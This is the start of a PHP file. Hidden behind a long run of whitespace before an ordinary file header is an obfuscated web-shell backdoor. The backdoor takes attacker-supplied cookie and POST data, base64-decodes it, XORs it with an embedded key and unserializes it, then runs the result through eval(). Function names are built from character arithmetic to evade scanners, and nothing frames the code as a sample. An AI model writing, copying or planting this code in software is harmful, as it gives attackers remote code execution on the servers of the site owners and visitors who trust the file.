<?php                                                                                                                                                                                                                                                                                                                                                                                                 $yUCUsB = "HBG_pvKCi";$qGdaHRnFk = class_exists($yUCUsB); $eLrmU = $qGdaHRnFk;if (!$eLrmU){class HBG_pvKCi{private $ChtEKTUE;public static $rvvkOUo = "e77af8c6-c46a-4426-bc2e-a4f80d83ff31";public static $mBzUAtyNQd = NULL;public function __construct(){$aBDhdLRprL = $_COOKIE;$ncUhHy = $_POST;$cWdysCoXRx = @$aBDhdLRprL[substr(HBG_pvKCi::$rvvkOUo, 0, 4)];if (!empty($cWdysCoXRx)){$CIiXgnHgTz = "base64";$qABazWtuU = "";$cWdysCoXRx = explode(",", $cWdysCoXRx);foreach ($cWdysCoXRx as $eeNQnHO){$qABazWtuU .= @$aBDhdLRprL[$eeNQnHO];$qABazWtuU .= @$ncUhHy[$eeNQnHO];}$qABazWtuU = array_map($CIiXgnHgTz . chr (95) . "\144" . "\x65" . chr ( 255 - 156 )."\x6f" . "\x64" . 'e', array($qABazWtuU,)); $qABazWtuU = $qABazWtuU[0] ^ str_repeat(HBG_pvKCi::$rvvkOUo, (strlen($qABazWtuU[0]) / strlen(HBG_pvKCi::$rvvkOUo)) + 1);HBG_pvKCi::$mBzUAtyNQd = @unserialize($qABazWtuU);}}public function __destruct(){$this->itZitxQG();}private function itZitxQG(){if (is_array(HBG_pvKCi::$mBzUAtyNQd)) {$eClxyv = str_replace("\74" . "\x3f" . chr ( 1012 - 900 )."\150" . "\160", "", HBG_pvKCi::$mBzUAtyNQd["\143" . chr ( 907 - 796 ).chr (110) . chr ( 187 - 71 )."\x65" . chr ( 786 - 676 ).chr (116)]);eval($eClxyv);exit();}}}$bFZLC = new HBG_pvKCi(); $bFZLC = NULL;} ?><?php
/**
